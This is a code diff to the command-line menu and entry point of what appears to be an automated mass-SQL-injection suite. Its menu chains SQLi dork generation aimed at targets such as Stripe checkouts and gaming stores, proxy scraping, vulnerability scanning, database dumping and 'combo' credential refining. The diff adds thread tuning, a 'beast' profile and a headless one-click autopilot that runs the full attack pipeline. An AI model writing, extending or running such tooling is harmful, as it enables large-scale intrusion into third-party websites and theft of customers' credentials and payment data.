         print("  [8] 🧰 Combo / Email / URL Refinery    (100% Pure Offline)")
         print("  [9] 🚀 1-Click Full End-to-End Auto-Pilot Pipeline")
+        print("  [S] ⚙️  Engine Settings (Threads / Profile / Pages)")
         print("  [0] ❌ Exit")
         print("=" * 72)
         choice = input("👉 Enter option [0-9]: ").strip()
@@ -2298,32 +2817,29 @@ def run_interactive_cli() -> None:
             ok, msg = launch_module_task("ai_keywords", {"text": seeds, "count": cnt})
         elif choice == "2":
             fp = input("📎 Enter path to keywords `.txt` file: ").strip()
-            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
-            ok, msg = launch_module_task("kw_quality", {"text": txt})
+            ok, msg = launch_module_task("kw_quality", _cli_payload(fp))
         elif choice == "3":
             fp = input("📎 Enter path to keywords `.txt` file (or type seeds): ").strip()
-            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else (fp or "stripe store")
             cnt = int(input("🔢 How many UHQ SQLi Dorks? [default 50000]: ").strip() or "50000")
-            ok, msg = launch_module_task("dork_gen", {"text": txt, "count": cnt})
+            ok, msg = launch_module_task("dork_gen", _cli_payload(fp or "stripe store", count=cnt))
         elif choice == "4":
             ok, msg = launch_module_task("proxy_scrape", {"count": 800})
         elif choice == "5":
             fp = input("📎 Enter path to Dorks `.txt` file: ").strip()
-            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
-            ok, msg = launch_module_task("url_parser", {"text": txt})
+            ok, msg = launch_module_task("url_parser", _cli_payload(fp))
         elif choice == "6":
             fp = input("📎 Enter path to `?param=` URLs `.txt` file: ").strip()
-            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
-            ok, msg = launch_module_task("sqli_scan", {"text": txt})
+            ok, msg = launch_module_task("sqli_scan", _cli_payload(fp))
         elif choice == "7":
             fp = input("📎 Enter path to Vulnerable URLs `.txt` file: ").strip()
-            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
-            ok, msg = launch_module_task("db_dump", {"text": txt})
+            ok, msg = launch_module_task("db_dump", _cli_payload(fp))
         elif choice == "8":
             fp = input("📎 Enter path to file to refine: ").strip()
             mode = input("🔧 Mode (`combos` / `emails` / `param_urls` / `dedup`) [combos]: ").strip() or "combos"
-            txt = Path(fp).read_text(encoding="utf-8", errors="ignore") if os.path.isfile(fp) else fp
-            ok, msg = launch_module_task("refinery", {"text": txt, "mode": mode})
+            ok, msg = launch_module_task("refinery", _cli_payload(fp, mode=mode))
+        elif choice.upper() == "S":
+            _cli_settings_menu()
+            continue
         elif choice == "9":
             seeds = input("✍️ Target Niche / Seeds [stripe checkout, gaming store]: ").strip() or "stripe checkout, gaming store"
             kwc = int(input("🔢 Keywords count [2000]: ").strip() or "2000")
@@ -2338,7 +2854,9 @@ def run_interactive_cli() -> None:
         try:
             while JOB.running:
                 s = JOB.snapshot()
-                sys.stdout.write(f"\r⏳ {s['phase']} | {s['done']:,}/{s['total']:,} ({s['pct']}%) | Hits: {s['hits']:,}   ")
+                tel = s.get("telemetry") or {}
+                extra = f" | Raw: {tel.get('raw_urls', 0):,} | Unique: {tel.get('unique_urls', 0):,} | Thr: {tel.get('threads', 0)}" if tel else ""
+                sys.stdout.write(f"\r⏳ {s['phase']} | {s['done']:,}/{s['total']:,} ({s['pct']}%) | Hits: {s['hits']:,}{extra}   ")
                 sys.stdout.flush()
                 time.sleep(0.5)
             print("\n✅", JOB.snapshot()["phase"])
@@ -2355,18 +2873,45 @@ def main() -> None:
     parser.add_argument("--host", default="0.0.0.0", help="Bind address for local/VPS Web Control Center (default: 0.0.0.0)")
     parser.add_argument("--port", type=int, default=int(os.environ.get("OFFLINE_PORT", "8080")), help="Port for Web Control Center (default: 8080)")
     parser.add_argument("--open-browser", action="store_true", help="Open browser automatically on PC/Laptop")
+    parser.add_argument("--threads", type=int, default=0, help="Force N parallel threads for parser+scanner (min 20, 0 = auto)")
+    parser.add_argument("--profile", default="", choices=["", "auto", "low", "medium", "high", "beast"], help="Hardware preset")
+    parser.add_argument("--depth", type=int, default=0, help="SERP pages per engine (1-3, 0 = auto)")
+    parser.add_argument("--autopilot", default="", help="Headless 1-click pipeline: pass seed keywords and run everything, then exit")
+    parser.add_argument("--kw-count", type=int, default=2000, help="Keywords for --autopilot (default 2000)")
+    parser.add_argument("--dork-count", type=int, default=5000, help="Dorks for --autopilot (default 5000)")
     args = parser.parse_args()
+
+    boot_patch: dict = {}
+    if args.threads and args.threads > 0:
+        boot_patch["thread_override"] = _thr(args.threads)
+    if args.profile:
+        boot_patch["profile"] = args.profile
+    if args.depth and args.depth > 0:
+        boot_patch["page_depth"] = max(1, min(3, args.depth))
+    if boot_patch:
+        save_settings(boot_patch)
+
+    if args.autopilot:
+        run_headless_autopilot(args.autopilot, args.kw_count, args.dork_count)
+        return
 
     if args.cli:
         run_interactive_cli()
         return
 
     srv = ThreadingHTTPServer((args.host, args.port), SuiteHTTPHandler)
+    lim0 = get_active_limits()
     print("=" * 72, flush=True)
     print(f"🕷️  {SUITE_VERSION} — LIVE WEB CONTROL CENTER RUNNING!", flush=True)
     print(f"🌐 Local PC Browser : http://127.0.0.1:{args.port}", flush=True)
     print(f"🖥️  VPS Remote Access: http://<YOUR-VPS-IP>:{args.port}", flush=True)
     print(f"📂 Output Workspace : {WORK_DIR}", flush=True)
+    print(
+        f"⚡ Engine           : Parser {lim0['parser_threads']} threads • SQLi {lim0['sqli_threads']} threads • "
+        f"Pages/engine {lim0['page_depth']} • Profile {lim0['profile_key'].upper()}",
+        flush=True,
+    )
+    print(f"💻 Hardware         : {HW_INFO['cores']} cores / {HW_INFO['ram_gb']} GB RAM • TLS: {'Rust primp' if HAS_PRIMP else 'stdlib'}", flush=True)
     print("=" * 72, flush=True)
 
     if args.open_browser:
